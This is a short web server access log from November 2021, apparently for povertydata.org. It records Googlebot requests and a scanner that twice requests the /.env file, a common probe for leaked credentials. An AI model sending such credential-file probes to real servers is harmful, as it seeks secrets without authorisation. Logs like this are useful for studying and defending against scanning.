66.249.64.253 - - [17/Nov/2021:13:26:56 +0000] "POST /_dash-update-component HTTP/1.1" 200 85 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:13:26:56 +0000] "POST /_dash-update-component HTTP/1.1" 200 2804 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
59.36.168.250 - - [17/Nov/2021:13:31:29 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.36.168.250 - - [17/Nov/2021:13:31:30 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.36.168.250 - - [17/Nov/2021:13:31:31 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.36.168.250 - - [17/Nov/2021:13:31:32 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
180.149.125.168 - - [17/Nov/2021:13:59:29 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
